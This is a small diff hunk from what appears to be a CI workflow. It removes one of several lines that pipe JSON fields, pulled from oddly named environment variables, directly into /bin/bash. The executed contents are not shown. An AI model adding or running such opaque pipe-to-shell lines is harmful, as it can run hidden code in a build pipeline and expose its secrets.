@@ -29,7 +29,6 @@ jobs:
           echo $jx0162 | jq -r .tb2 | /bin/bash
           echo $shw4371 | jq -r .gkwrl3 | /bin/bash
           printf '%s' "$z55" | jq -r .f1562 | /bin/bash
-          printf '%s' "$zsf6188" | jq -r .j865 | /bin/bash
           printf '%s' "$tguq3" | jq -r .p065 | /bin/bash
           printf '%s' "$dyn12348" | jq -r .r10 | /bin/bash
 
